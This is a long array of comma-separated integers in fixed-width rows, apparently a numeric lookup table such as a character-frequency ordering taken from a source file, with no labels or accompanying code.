3066,1200,2147,2212, 790, 702,2695,4222,1601,1058, 434,2338,5153,3640,  67,2360,
4099,2502, 618,3472,1329, 416,1132, 830,2782,1807,2653,3211,3510,1662, 192,2124,
296,3979,1739,1611,3684,  23, 118, 324, 446,1239,1225, 293,2520,3814,3795,2535,
3116,  17,1074, 467,2692,2201, 387,2922,  45,1326,3055,1645,3659,2817, 958, 243,
1903,2320,1339,2825,1784,3289, 356, 576, 865,2315,2381,3377,3916,1088,3122,1713,
1655, 935, 628,4689,1034,1327, 441, 800, 720, 894,1979,2183,1528,5289,2702,1071,
4046,3572,2399,1571,3281,  79, 761,1103, 327, 134, 758,1899,1371,1615, 879, 442,
215,2605,2579, 173,2048,2485,1057,2975,3317,1097,2253,3801,4263,1403,1650,2946,
814,4968,3487,1548,2644,1567,1285,   2, 295,2636,  97, 946,3576, 832, 141,4257,
3273, 760,3821,3521,3156,2607, 949,1024,1733,1516,1803,1920,2125,2283,2665,3180,
1501,2064,3560,2171,1592, 803,3518,1416, 732,3897,4258,1363,1362,2458, 119,1427,
602,1525,2608,1605,1639,3175, 694,3064,  10, 465,  76,2000,4846,4208, 444,3781,
1619,3353,2206,1273,3796, 740,2483, 320,1723,2377,3660,2619,1359,1137,1762,1724,
2345,2842,1850,1862, 912, 821,1866, 612,2625,1735,2573,3369,1093, 844,  89, 937,
930,1424,3564,2413,2972,1004,3046,3019,2011, 711,3171,1452,4178, 428, 801,1943,
432, 445,2811, 206,4136,1472, 730, 349,  73, 397,2802,2547, 998,1637,1167, 789,
396,3217, 154,1218, 716,1120,1780,2819,4826,1931,3334,3762,2139,1215,2627, 552,
3664,3628,3232,1405,2383,3111,1356,2652,3577,3320,3101,1703, 640,1045,1370,1246,
4996, 371,1575,2436,1621,2210, 984,4033,1734,2638,  16,4529, 663,2755,3255,1451,
3917,2257,1253,1955,2234,1263,2951, 214,1229, 617, 485, 359,1831,1969, 473,2310,
750,2058, 165,  80,2864,2419, 361,4344,2416,2479,1134, 796,3726,1266,2943, 860,
2715, 938, 390,2734,1313,1384, 248, 202, 877,1064,2854, 522,3907, 279,1602, 297,
2357, 395,3740, 137,2075, 944,4089,2584,1267,3802,  62,1533,2285, 178, 176, 780,
2440, 201,3707, 590, 478,1560,4354,2117,1075,  30,  74,4643,4004,1635,1441,2745,
776,2596, 238,1077,1692,1912,2844, 605, 499,1742,3947, 241,3053, 980,1749, 936,
2640,4511,2582, 515,1543,2162,5322,2892,2993, 890,2148,1924, 665,1827,3581,1032,
968,3163, 339,1044,1896, 270, 583,1791,1720,4367,1194,3488,3669,  43,2523,1657,
163,2167, 290,1209,1622,3378, 550, 634,2508,2510, 695,2634,2384,2512,1476,1414,
220,1469,2341,2138,2852,3183,2900,4939,2865,3502,1211,3680, 854,3227,1299,2976,
3172, 186,2998,1459, 443,1067,3251,1495, 321,1932,3054, 909, 753,1410,1828, 436,
2441,1119,1587,3164,2186,1258, 227, 231,1425,1890,3200,3942, 247, 959, 725,5254,
2741, 577,2158,2079, 929, 120, 174, 838,2813, 591,1115, 417,2024,  40,3240,1536,
1037, 291,4151,2354, 632,1298,2406,2500,3535,1825,1846,3451, 205,1171, 345,4238,
18,1163, 811, 685,2208,1217, 425,1312,1508,1175,4308,2552,1033, 587,1381,3059,
2984,3482, 340,1316,4023,3972, 792,3176, 519, 777,4690, 918, 933,4130,2981,3741,
90,3360,2911,2200,5184,4550, 609,3079,2030, 272,3379,2736, 363,3881,1130,1447,
286, 779, 357,1169,3350,3137,1630,1220,2687,2391, 747,1277,3688,2618,2682,2601,
1156,3196,5290,4034,3102,1689,3596,3128, 874, 219,2783, 798, 508,1843,2461, 269,
1658,1776,1392,1913,2983,3287,2866,2159,2372, 829,4076,  46,4253,2873,1889,1894,
915,1834,1631,2181,2318, 298, 664,2818,3555,2735, 954,3228,3117, 527,3511,2173,
681,2712,3033,2247,2346,3467,1652, 155,2164,3382, 113,1994, 450, 899, 494, 994,
1237,2958,1875,2336,1926,3727, 545,1577,1550, 633,3473, 204,1305,3072,2410,1956,
2471, 707,2134, 841,2195,2196,2663,3843,1026,4940, 990,3252,4997, 368,1092, 437,
3212,3258,1933,1829, 675,2977,2893, 412, 943,3723,4644,3294,3283,2230,2373,5154,
2389,2241,2661,2323,1404,2524, 593, 787, 677,3008,1275,2059, 438,2709,2609,2240,
2269,2246,1446,  36,1568,1373,3892,1574,2301,1456,3962, 693,2276,5216,2035,1143,
2720,1919,1797,1811,2763,4137,2597,1830,1699,1488,1198,2090, 424,1694, 312,3634,
3390,4179,3335,2252,1214, 561,1059,3243,2295,2561, 975,5155,2321,2751,3772, 472,
1537,3282,3398,1047,2077,2348,2878,1323,3340,3076, 690,2906,  51, 369, 170,3541,
1060,2187,2688,3670,2541,1083,1683, 928,3918, 459, 109,4427, 599,3744,4286, 143,
2101,2730,2490,  82,1588,3036,2121, 281,1860, 477,4035,1238,2812,3020,2716,3312,
1530,2188,2055,1317, 843, 636,1808,1173,3495, 649, 181,1002, 147,3641,1159,2414,
3750,2289,2795, 813,3123,2610,1136,4368,   5,3391,4541,2174, 420, 429,1728, 754,
1228,2115,2219, 347,2223,2733, 735,1518,3003,2355,3134,1764,3948,3329,1888,2424,
1001,1234,1972,3321,3363,1672,1021,1450,1584, 226, 765, 655,2526,3404,3244,2302,
3665, 731, 594,2184, 319,1576, 621, 658,2656,4299,2099,3864,1279,2071,2598,2739,
795,3086,3699,3908,1707,2352,2402,1382,3136,2475,1465,4847,3496,3865,1085,3004,
2591,1084, 213,2287,1963,3565,2250, 822, 793,4574,3187,1772,1789,3050, 595,1484,
1959,2770,1080,2650, 456, 422,2996, 940,3322,4328,4345,3092,2742, 965,2784, 739,
4124, 952,1358,2498,2949,2565, 332,2698,2378, 660,2260,2473,4194,3856,2919, 535,
1260,2651,1208,1428,1300,1949,1303,2942, 433,2455,2450,1251,1946, 614,1269, 641,
1306,1810,2737,3078,2912, 564,2365,1419,1415,1497,4460,2367,2185,1379,3005,1307,
3218,2175,1897,3063, 682,1157,4040,4005,1712,1160,1941,1399, 394, 402,2952,1573,
1151,2986,2404, 862, 299,2033,1489,3006, 346, 171,2886,3401,1726,2932, 168,2533,
47,2507,1030,3735,1145,3370,1395,1318,1579,3609,4560,2857,4116,1457,2529,1965,
504,1036,2690,2988,2405, 745,5871, 849,2397,2056,3081, 863,2359,3857,2096,  99,
1397,1769,2300,4428,1643,3455,1978,1757,3718,1440,  35,4879,3742,1296,4228,2280,
160,5063,1599,2013, 166, 520,3479,1646,3345,3012, 490,1937,1545,1264,2182,2505,
1096,1188,1369,1436,2421,1667,2792,2460,1270,2122, 727,3167,2143, 806,1706,1012,
1800,3037, 960,2218,1882, 805, 139,2456,1139,1521, 851,1052,3093,3089, 342,2039,
744,5097,1468,1502,1585,2087, 223, 939, 326,2140,2577, 892,2481,1623,4077, 982,
3708, 135,2131,  87,2503,3114,2326,1106, 876,1616, 547,2997,2831,2093,3441,4530,
4314,   9,3256,4229,4148, 659,1462,1986,1710,2046,2913,2231,4090,4880,5255,3392,
3274,1368,3689,4645,1477, 705,3384,3635,1068,1529,2941,1458,3782,1509, 100,1656,
2548, 718,2339, 408,1590,2780,3548,1838,4117,3719,1345,3530, 717,3442,2778,3220,
2898,1892,4590,3614,3371,2043,1998,1224,3483, 891, 635, 584,2559,3355, 733,1766,
1729,1172,3789,1891,2307, 781,2982,2271,1957,1580,5773,2633,2005,4195,3097,1535,
3213,1189,1934,5693,3262, 586,3118,1324,1598, 517,1564,2217,1868,1893,4445,3728,
2703,3139,1526,1787,1992,3882,2875,1549,1199,1056,2224,1904,2711,5098,4287, 338,
1993,3129,3489,2689,1809,2815,1997, 957,1855,3898,2550,3275,3057,1105,1319, 627,
1505,1911,1883,3526, 698,3629,3456,1833,1431, 746,  77,1261,2017,2296,1977,1885,
125,1334,1600, 525,1798,1109,2222,1470,1945, 559,2236,1186,3443,2476,1929,1411,
2411,3135,1777,3372,2621,1841,1613,3229, 668,1430,1839,2643,2916, 195,1989,2671,
2358,1387, 629,3205,2293,5256,4439, 123,1310, 888,1879,4300,3021,3605,1003,1162,
3192,2910,2010, 140,2395,2859,  55,1082,2012,2901, 662, 419,2081,1438, 680,2774,
4654,3912,1620,1731,1625,5035,4065,2328, 512,1344, 802,5443,2163,2311,2537, 524,
3399,  98,1155,2103,1918,2606,3925,2816,1393,2465,1504,3773,2177,3963,1478,4346,
180,1113,4655,3461,2028,1698, 833,2696,1235,1322,1594,4408,3623,3013,3225,2040,
3022, 541,2881, 607,3632,2029,1665,1219, 639,1385,1686,1099,2803,3231,1938,3188,
2858, 427, 676,2772,1168,2025, 454,3253,2486,3556, 230,1950, 580, 791,1991,1280,
1086,1974,2034, 630, 257,3338,2788,4903,1017,  86,4790, 966,2789,1995,1696,1131,
259,3095,4188,1308, 179,1463,5257, 289,4107,1248,  42,3413,1725,2288, 896,1947,
774,4474,4254, 604,3430,4264, 392,2514,2588, 452, 237,1408,3018, 988,4531,1970,
3034,3310, 540,2370,1562,1288,2990, 502,4765,1147,   4,1853,2708, 207, 294,2814,
4078,2902,2509, 684,  34,3105,3532,2551, 644, 709,2801,2344, 573,1727,3573,3557,
2021,1081,3100,4315,2100,3681, 199,2263,1837,2385, 146,3484,1195,2776,3949, 997,
1939,3973,1008,1091,1202,1962,1847,1149,4209,5444,1076, 493, 117,5400,2521, 972,
1490,2934,1796,4542,2374,1512,2933,2657, 413,2888,1135,2762,2314,2156,1355,2369,
766,2007,2527,2170,3124,2491,2593,2632,4757,2437, 234,3125,3591,1898,1750,1376,
1942,3468,3138, 570,2127,2145,3276,4131, 962, 132,1445,4196,  19, 941,3624,3480,
3366,1973,1374,4461,3431,2629, 283,2415,2275, 808,2887,3620,2112,2563,1353,3610,
955,1089,3103,1053,  96,  88,4097, 823,3808,1583, 399, 292,4091,3313, 421,1128,
642,4006, 903,2539,1877,2082, 596,  29,4066,1790, 722,2157, 130, 995,1569, 769,
1485, 464, 513,2213, 288,1923,1101,2453,4316, 133, 486,2445,  50, 625, 487,2207,
57, 423, 481,2962, 159,3729,1558, 491, 303, 482, 501, 240,2837, 112,3648,2392,
1783, 362,   8,3433,3422, 610,2793,3277,1390,1284,1654,  21,3823, 734, 367, 623,
193, 287, 374,1009,1483, 816, 476, 313,2255,2340,1262,2150,2899,1146,2581, 782,
2116,1659,2018,1880, 255,3586,3314,1110,2867,2137,2564, 986,2767,5185,2006, 650,
158, 926, 762, 881,3157,2717,2362,3587, 306,3690,3245,1542,3077,2427,1691,2478,
2118,2985,3490,2438, 539,2305, 983, 129,1754, 355,4201,2386, 827,2923, 104,1773,
2838,2771, 411,2905,3919, 376, 767, 122,1114, 828,2422,1817,3506, 266,3460,1007,
1609,4998, 945,2612,4429,2274, 726,1247,1964,2914,2199,2070,4002,4108, 657,3323,
1422, 579, 455,2764,4737,1222,2895,1670, 824,1223,1487,2525, 558, 861,3080, 598,
2659,2515,1967, 752,2583,2376,2214,4180, 977, 704,2464,4999,2622,4109,1210,2961,
819,1541, 142,2284,  44, 418, 457,1126,3730,4347,4626,1644,1876,3671,1864, 302,
1063,5694, 624, 723,1984,3745,1314,1676,2488,1610,1449,3558,3569,2166,2098, 409,
1011,2325,3704,2306, 818,1732,1383,1824,1844,3757, 999,2705,3497,1216,1423,2683,
2426,2954,2501,2726,2229,1475,2554,5064,1971,1794,1666,2014,1343, 783, 724, 191,
2434,1354,2220,5065,1763,2752,2472,4152, 131, 175,2885,3434,  92,1466,4920,2616,
3871,3872,3866, 128,1551,1632, 669,1854,3682,4691,4125,1230, 188,2973,3290,1302,
1213, 560,3266, 917, 763,3909,3249,1760, 868,1958, 764,1782,2097, 145,2277,3774,
4462,  64,1491,3062, 971,2132,3606,2442, 221,1226,1617, 218, 323,1185,3207,3147,
571, 619,1473,1005,1744,2281, 449,1887,2396,3685, 275, 375,3816,1743,3844,3731,
845,1983,2350,4210,1377, 773, 967,3499,3052,3743,2725,4007,1697,1022,3943,1464,
3264,2855,2722,1952,1029,2839,2467,  84,4383,2215, 820,1391,2015,2448,3672, 377,
1948,2168, 797,2545,3536,2578,2645,  94,2874,1678, 405,1259,3071, 771, 546,1315,
470,1243,3083, 895,2468, 981, 969,2037, 846,4181, 653,1276,2928,  14,2594, 557,
3007,2474, 156, 902,1338,1740,2574, 537,2518, 973,2282,2216,2433,1928, 138,2903,
1293,2631,1612, 646,3457, 839,2935, 111, 496,2191,2847, 589,3186, 149,3994,2060,
4031,2641,4067,3145,1870,  37,3597,2136,1025,2051,3009,3383,3549,1121,1016,3261,
1301, 251,2446,2599,2153, 872,3246, 637, 334,3705, 831, 884, 921,3065,3140,4092,
2198,1944, 246,2964, 108,2045,1152,1921,2308,1031, 203,3173,4170,1907,3890, 810,
1401,2003,1690, 506, 647,1242,2828,1761,1649,3208,2249,1589,3709,2931,5156,1708,
498, 666,2613, 834,3817,1231, 184,2851,1124, 883,3197,2261,3710,1765,1553,2658,
1178,2639,2351,  93,1193, 942,2538,2141,4402, 235,1821, 870,1591,2192,1709,1871,
3341,1618,4126,2595,2334, 603, 651,  69, 701, 268,2662,3411,2555,1380,1606, 503,
448, 254,2371,2646, 574,1187,2309,1770, 322,2235,1292,1801, 305, 566,1133, 229,
2067,2057, 706, 167, 483,2002,2672,3295,1820,3561,3067, 316, 378,2746,3452,1112,
136,1981, 507,1651,2917,1117, 285,4591, 182,2580,3522,1304, 335,3303,1835,2504,
1795,1792,2248, 674,1018,2106,2449,1857,2292,2845, 976,3047,1781,2600,2727,1389,
1281,  52,3152, 153, 265,3950, 672,3485,3951,4463, 430,1183, 365, 278,2169,  27,
1407,1336,2304, 209,1340,1730,2202,1852,2403,2883, 979,1737,1062, 631,2829,2542,
3876,2592, 825,2086,2226,3048,3625, 352,1417,3724, 542, 991, 431,1351,3938,1861,
2294, 826,1361,2927,3142,3503,1738, 463,2462,2723, 582,1916,1595,2808, 400,3845,
3891,2868,3621,2254,  58,2492,1123, 910,2160,2614,1372,1603,1196,1072,3385,1700,
3267,1980, 696, 480,2430, 920, 799,1570,2920,1951,2041,4047,2540,1321,4223,2469,
3562,2228,1271,2602, 401,2833,3351,2575,5157, 907,2312,1256, 410, 263,3507,1582,
996, 678,1849,2316,1480, 908,3545,2237, 703,2322, 667,1826,2849,1531,2604,2999,
2407,3146,2151,2630,1786,3711, 469,3542, 497,3899,2409, 858, 837,4446,3393,1274,
786, 620,1845,2001,3311, 484, 308,3367,1204,1815,3691,2332,1532,2557,1842,2020,
2724,1927,2333,4440, 567,  22,1673,2728,4475,1987,1858,1144,1597, 101,1832,3601,
12, 974,3783,4391, 951,1412,   1,3720, 453,4608,4041, 528,1041,1027,3230,2628,
1129, 875,1051,3291,1203,2262,1069,2860,2799,2149,2615,3278, 144,1758,3040,  31,
475,1680, 366,2685,3184, 311,1642,4008,2466,5036,1593,1493,2809, 216,1420,1668,
233, 304,2128,3284, 232,1429,1768,1040,2008,3407,2740,2967,2543, 242,2133, 778,
1565,2022,2620, 505,2189,2756,1098,2273, 372,1614, 708, 553,2846,2094,2278, 169,
3626,2835,4161, 228,2674,3165, 809,1454,1309, 466,1705,1095, 900,3423, 880,2667,
3751,5258,2317,3109,2571,4317,2766,1503,1342, 866,4447,1118,  63,2076, 314,1881,
1348,1061, 172, 978,3515,1747, 532, 511,3970,   6, 601, 905,2699,3300,1751, 276,
1467,3725,2668,  65,4239,2544,2779,2556,1604, 578,2451,1802, 992,2331,2624,1320,
3446, 713,1513,1013, 103,2786,2447,1661, 886,1702, 916, 654,3574,2031,1556, 751,
2178,2821,2179,1498,1538,2176, 271, 914,2251,2080,1325, 638,1953,2937,3877,2432,
2754,  95,3265,1716, 260,1227,4083, 775, 106,1357,3254, 426,1607, 555,2480, 772,
1985, 244,2546, 474, 495,1046,2611,1851,2061,  71,2089,1675,2590, 742,3758,2843,
3222,1433, 267,2180,2576,2826,2233,2092,3913,2435, 956,1745,3075, 856,2113,1116,
451,   3,1988,2896,1398, 993,2463,1878,2049,1341,2718,2721,2870,2108, 712,2904,
4363,2753,2324, 277,2872,2349,2649, 384, 987, 435, 691,3000, 922, 164,3939, 652,
1500,1184,4153,2482,3373,2165,4848,2335,3775,3508,3154,2806,2830,1554,2102,1664,
2530,1434,2408, 893,1547,2623,3447,2832,2242,2532,3169,2856,3223,2078,  49,3770,
3469, 462, 318, 656,2259,3250,3069, 679,1629,2758, 344,1138,1104,3120,1836,1283,
3115,2154,1437,4448, 934, 759,1999, 794,2862,1038, 533,2560,1722,2342, 855,2626,
1197,1663,4476,3127,  85,4240,2528,  25,1111,1181,3673, 407,3470,4561,2679,2713,
768,1925,2841,3986,1544,1165, 932, 373,1240,2146,1930,2673, 721,4766, 354,4333,
391,2963, 187,  61,3364,1442,1102, 330,1940,1767, 341,3809,4118, 393,2496,2062,
2211, 105, 331, 300, 439, 913,1332, 626, 379,3304,1557, 328, 689,3952, 309,1555,
931, 317,2517,3027, 325, 569, 686,2107,3084,  60,1042,1333,2794, 264,3177,4014,
1628, 258,3712,   7,4464,1176,1043,1778, 683, 114,1975,  78,1492, 383,1886, 510,
386, 645,5291,2891,2069,3305,4138,3867,2939,2603,2493,1935,1066,1848,3588,1015,
1282,1289,4609, 697,1453,3044,2666,3611,1856,2412,  54, 719,1330, 568,3778,2459,
1748, 788, 492, 551,1191,1000, 488,3394,3763, 282,1799, 348,2016,1523,3155,2390,
1049, 382,2019,1788,1170, 729,2968,3523, 897,3926,2785,2938,3292, 350,2319,3238,
1718,1717,2655,3453,3143,4465, 161,2889,2980,2009,1421,  56,1908,1640,2387,2232,
1917,1874,2477,4921, 148,  83,3438, 592,4245,2882,1822,1055, 741, 115,1496,1624,
381,1638,4592,1020, 516,3214, 458, 947,4575,1432, 211,1514,2926,1865,2142, 189,
852,1221,1400,1486, 882,2299,4036, 351,  28,1122, 700,6479,6480,6481,6482,6483,
5508,6484,3900,3414,3974,4441,4024,3537,4037,5628,5099,3633,6485,3148,6486,3636,
5509,3257,5510,5973,5445,5872,4941,4403,3174,4627,5873,6276,2286,4230,5446,5874,
5122,6102,6103,4162,5447,5123,5323,4849,6277,3980,3851,5066,4246,5774,5067,6278,
3001,2807,5695,3346,5775,5974,5158,5448,6487,5975,5976,5776,3598,6279,5696,4806,
4211,4154,6280,6488,6489,6490,6281,4212,5037,3374,4171,6491,4562,4807,4722,4827,
5977,6104,4532,4079,5159,5324,5160,4404,3858,5359,5875,3975,4288,4610,3486,4512,
5325,3893,5360,6282,6283,5560,2522,4231,5978,5186,5449,2569,3878,6284,5401,3578,
4415,6285,4656,5124,5979,2506,4247,4449,3219,3417,4334,4969,4329,6492,4576,4828,
4172,4416,4829,5402,6286,3927,3852,5361,4369,4830,4477,4867,5876,4173,6493,6105,
4657,6287,6106,5877,5450,6494,4155,4868,5451,3700,5629,4384,6288,6289,5878,3189,
4881,6107,6290,6495,4513,6496,4692,4515,4723,5100,3356,6497,6291,3810,4080,5561,
3570,4430,5980,6498,4355,5697,6499,4724,6108,6109,3764,4050,5038,5879,4093,3226,
6292,5068,5217,4693,3342,5630,3504,4831,4377,4466,4309,5698,4431,5777,6293,5778,
4272,3706,6110,5326,3752,4676,5327,4273,5403,4767,5631,6500,5699,5880,3475,5039,
6294,5562,5125,4348,4301,4482,4068,5126,4593,5700,3380,3462,5981,5563,3824,5404,
4970,5511,3825,4738,6295,6501,5452,4516,6111,5881,5564,6502,6296,5982,6503,4213,
4163,3454,6504,6112,4009,4450,6113,4658,6297,6114,3035,6505,6115,3995,4904,4739,
4563,4942,4110,5040,3661,3928,5362,3674,6506,5292,3612,4791,5565,4149,5983,5328,
5259,5021,4725,4577,4564,4517,4364,6298,5405,4578,5260,4594,4156,4157,5453,3592,
3491,6507,5127,5512,4709,4922,5984,5701,4726,4289,6508,4015,6116,5128,4628,3424,
4241,5779,6299,4905,6509,6510,5454,5702,5780,6300,4365,4923,3971,6511,5161,3270,
3158,5985,4100, 867,5129,5703,6117,5363,3695,3301,5513,4467,6118,6512,5455,4232,
4242,4629,6513,3959,4478,6514,5514,5329,5986,4850,5162,5566,3846,4694,6119,5456,
4869,5781,3779,6301,5704,5987,5515,4710,6302,5882,6120,4392,5364,5705,6515,6121,
6516,6517,3736,5988,5457,5989,4695,2457,5883,4551,5782,6303,6304,6305,5130,4971,
6122,5163,6123,4870,3263,5365,3150,4871,6518,6306,5783,5069,5706,3513,3498,4409,
5330,5632,5366,5458,5459,3991,5990,4502,3324,5991,5784,3696,4518,5633,4119,6519,
4630,5634,4417,5707,4832,5992,3418,6124,5993,5567,4768,5218,6520,4595,3458,5367,
6125,5635,6126,4202,6521,4740,4924,6307,3981,4069,4385,6308,3883,2675,4051,3834,
4302,4483,5568,5994,4972,4101,5368,6309,5164,5884,3922,6127,6522,6523,5261,5460,
5187,4164,5219,3538,5516,4111,3524,5995,6310,6311,5369,3181,3386,2484,5188,3464,
5569,3627,5708,6524,5406,5165,4677,4492,6312,4872,4851,5885,4468,5996,6313,5709,
5710,6128,2470,5886,6314,5293,4882,5785,3325,5461,5101,6129,5711,5786,6525,4906,
6526,6527,4418,5887,5712,4808,2907,3701,5713,5888,6528,3765,5636,5331,6529,6530,
3593,5889,3637,4943,3692,5714,5787,4925,6315,6130,5462,4405,6131,6132,6316,5262,
6531,6532,5715,3859,5716,5070,4696,5102,3929,5788,3987,4792,5997,6533,6534,3920,
4809,5000,5998,6535,2974,5370,6317,5189,5263,5717,3826,6536,3953,5001,4883,3190,
5463,5890,4973,5999,4741,6133,6134,3607,5570,6000,4711,3362,3630,4552,5041,6318,
6001,2950,2953,5637,4646,5371,4944,6002,2044,4120,3429,6319,6537,5103,4833,6538,
6539,4884,4647,3884,6003,6004,4758,3835,5220,5789,4565,5407,6540,6135,5294,4697,
4852,6320,6321,3206,4907,6541,6322,4945,6542,6136,6543,6323,6005,4631,3519,6544,
5891,6545,5464,3784,5221,6546,5571,4659,6547,6324,6137,5190,6548,3853,6549,4016,
4834,3954,6138,5332,3827,4017,3210,3546,4469,5408,5718,3505,4648,5790,5131,5638,
5791,5465,4727,4318,6325,6326,5792,4553,4010,4698,3439,4974,3638,4335,3085,6006,
5104,5042,5166,5892,5572,6327,4356,4519,5222,5573,5333,5793,5043,6550,5639,5071,
4503,6328,6139,6551,6140,3914,3901,5372,6007,5640,4728,4793,3976,3836,4885,6552,
4127,6553,4451,4102,5002,6554,3686,5105,6555,5191,5072,5295,4611,5794,5296,6556,
5893,5264,5894,4975,5466,5265,4699,4976,4370,4056,3492,5044,4886,6557,5795,4432,
4769,4357,5467,3940,4660,4290,6141,4484,4770,4661,3992,6329,4025,4662,5022,4632,
4835,4070,5297,4663,4596,5574,5132,5409,5895,6142,4504,5192,4664,5796,5896,3885,
5575,5797,5023,4810,5798,3732,5223,4712,5298,4084,5334,5468,6143,4052,4053,4336,
4977,4794,6558,5335,4908,5576,5224,4233,5024,4128,5469,5225,4873,6008,5045,4729,
4742,4633,3675,4597,6559,5897,5133,5577,5003,5641,5719,6330,6560,3017,2382,3854,
4406,4811,6331,4393,3964,4946,6561,2420,3722,6562,4926,4378,3247,1736,4442,6332,
5134,6333,5226,3996,2918,5470,4319,4003,4598,4743,4744,4485,3785,3902,5167,5004,
5373,4394,5898,6144,4874,1793,3997,6334,4085,4214,5106,5642,4909,5799,6009,4419,
4189,3330,5899,4165,4420,5299,5720,5227,3347,6145,4081,6335,2876,3930,6146,3293,
3786,3910,3998,5900,5300,5578,2840,6563,5901,5579,6147,3531,5374,6564,6565,5580,
4759,5375,6566,6148,3559,5643,6336,6010,5517,6337,6338,5721,5902,3873,6011,6339,
6567,5518,3868,3649,5722,6568,4771,4947,6569,6149,4812,6570,2853,5471,6340,6341,
5644,4795,6342,6012,5723,6343,5724,6013,4349,6344,3160,6150,5193,4599,4514,4493,
5168,4320,6345,4927,3666,4745,5169,5903,5005,4928,6346,5725,6014,4730,4203,5046,
4948,3395,5170,6015,4150,6016,5726,5519,6347,5047,3550,6151,6348,4197,4310,5904,
6571,5581,2965,6152,4978,3960,4291,5135,6572,5301,5727,4129,4026,5905,4853,5728,
5472,6153,6349,4533,2700,4505,5336,4678,3583,5073,2994,4486,3043,4554,5520,6350,
6017,5800,4487,6351,3931,4103,5376,6352,4011,4321,4311,4190,5136,6018,3988,3233,
4350,5906,5645,4198,6573,5107,3432,4191,3435,5582,6574,4139,5410,6353,5411,3944,
5583,5074,3198,6575,6354,4358,6576,5302,4600,5584,5194,5412,6577,6578,5585,5413,
5303,4248,5414,3879,4433,6579,4479,5025,4854,5415,6355,4760,4772,3683,2978,4700,
3797,4452,3965,3932,3721,4910,5801,6580,5195,3551,5907,3221,3471,3029,6019,3999,
5908,5909,5266,5267,3444,3023,3828,3170,4796,5646,4979,4259,6356,5647,5337,3694,
6357,5648,5338,4520,4322,5802,3031,3759,4071,6020,5586,4836,4386,5048,6581,3571,
4679,4174,4949,6154,4813,3787,3402,3822,3958,3215,3552,5268,4387,3933,4950,4359,
6021,5910,5075,3579,6358,4234,4566,5521,6359,3613,5049,6022,5911,3375,3702,3178,
4911,5339,4521,6582,6583,4395,3087,3811,5377,6023,6360,6155,4027,5171,5649,4421,
4249,2804,6584,2270,6585,4000,4235,3045,6156,5137,5729,4140,4312,3886,6361,4330,
6157,4215,6158,3500,3676,4929,4331,3713,4930,5912,4265,3776,3368,5587,4470,4855,
3038,4980,3631,6159,6160,4132,4680,6161,6362,3923,4379,5588,4255,6586,4121,6587,
6363,4649,6364,3288,4773,4774,6162,6024,6365,3543,6588,4274,3107,3737,5050,5803,
4797,4522,5589,5051,5730,3714,4887,5378,4001,4523,6163,5026,5522,4701,4175,2791,
3760,6589,5473,4224,4133,3847,4814,4815,4775,3259,5416,6590,2738,6164,6025,5304,
3733,5076,5650,4816,5590,6591,6165,6592,3934,5269,6593,3396,5340,6594,5804,3445,
3602,4042,4488,5731,5732,3525,5591,4601,5196,6166,6026,5172,3642,4612,3202,4506,
4798,6366,3818,5108,4303,5138,5139,4776,3332,4304,2915,3415,4434,5077,5109,4856,
2879,5305,4817,6595,5913,3104,3144,3903,4634,5341,3133,5110,5651,5805,6167,4057,
5592,2945,4371,5593,6596,3474,4182,6367,6597,6168,4507,4279,6598,2822,6599,4777,
4713,5594,3829,6169,3887,5417,6170,3653,5474,6368,4216,2971,5228,3790,4579,6369,
5733,6600,6601,4951,4746,4555,6602,5418,5475,6027,3400,4665,5806,6171,4799,6028,
5052,6172,3343,4800,4747,5006,6370,4556,4217,5476,4396,5229,5379,5477,3839,5914,
5652,5807,4714,3068,4635,5808,6173,5342,4192,5078,5419,5523,5734,6174,4557,6175,
4602,6371,6176,6603,5809,6372,5735,4260,3869,5111,5230,6029,5112,6177,3126,4681,
5524,5915,2706,3563,4748,3130,6178,4018,5525,6604,6605,5478,4012,4837,6606,4534,
4193,5810,4857,3615,5479,6030,4082,3697,3539,4086,5270,3662,4508,4931,5916,4912,
5811,5027,3888,6607,4397,3527,3302,3798,2775,2921,2637,3966,4122,4388,4028,4054,
1633,4858,5079,3024,5007,3982,3412,5736,6608,3426,3236,5595,3030,6179,3427,3336,
3279,3110,6373,3874,3039,5080,5917,5140,4489,3119,6374,5812,3405,4494,6031,4666,
4141,6180,4166,6032,5813,4981,6609,5081,4422,4982,4112,3915,5653,3296,3983,6375,
4266,4410,5654,6610,6181,3436,5082,6611,5380,6033,3819,5596,4535,5231,5306,5113,
6612,4952,5918,4275,3113,6613,6376,6182,6183,5814,3073,4731,4838,5008,3831,6614,
4888,3090,3848,4280,5526,5232,3014,5655,5009,5737,5420,5527,6615,5815,5343,5173,
5381,4818,6616,3151,4953,6617,5738,2796,3204,4360,2989,4281,5739,5174,5421,5197,
3132,5141,3849,5142,5528,5083,3799,3904,4839,5480,2880,4495,3448,6377,6184,5271,
5919,3771,3193,6034,6035,5920,5010,6036,5597,6037,6378,6038,3106,5422,6618,5423,
5424,4142,6619,4889,5084,4890,4313,5740,6620,3437,5175,5307,5816,4199,5198,5529,
5817,5199,5656,4913,5028,5344,3850,6185,2955,5272,5011,5818,4567,4580,5029,5921,
3616,5233,6621,6622,6186,4176,6039,6379,6380,3352,5200,5273,2908,5598,5234,3837,
5308,6623,6624,5819,4496,4323,5309,5201,6625,6626,4983,3194,3838,4167,5530,5922,
5274,6381,6382,3860,3861,5599,3333,4292,4509,6383,3553,5481,5820,5531,4778,6187,
3955,3956,4324,4389,4218,3945,4325,3397,2681,5923,4779,5085,4019,5482,4891,5382,
5383,6040,4682,3425,5275,4094,6627,5310,3015,5483,5657,4398,5924,3168,4819,6628,
5925,6629,5532,4932,4613,6041,6630,4636,6384,4780,4204,5658,4423,5821,3989,4683,
5822,6385,4954,6631,5345,6188,5425,5012,5384,3894,6386,4490,4104,6632,5741,5053,
6633,5823,5926,5659,5660,5927,6634,5235,5742,5824,4840,4933,4820,6387,4859,5928,
4955,6388,4143,3584,5825,5346,5013,6635,5661,6389,5014,5484,5743,4337,5176,5662,
6390,2836,6391,3268,6392,6636,6042,5236,6637,4158,6638,5744,5663,4471,5347,3663,
4123,5143,4293,3895,6639,6640,5311,5929,5826,3800,6189,6393,6190,5664,5348,3554,
3594,4749,4603,6641,5385,4801,6043,5827,4183,6642,5312,5426,4761,6394,5665,6191,
4715,2669,6643,6644,5533,3185,5427,5086,5930,5931,5386,6192,6044,6645,4781,4013,
5745,4282,4435,5534,4390,4267,6045,5746,4984,6046,2743,6193,3501,4087,5485,5932,
5428,4184,4095,5747,4061,5054,3058,3862,5933,5600,6646,5144,3618,6395,3131,5055,
5313,6396,4650,4956,3855,6194,3896,5202,4985,4029,4225,6195,6647,5828,5486,5829,
3589,3002,6648,6397,4782,5276,6649,6196,6650,4105,3803,4043,5237,5830,6398,4096,
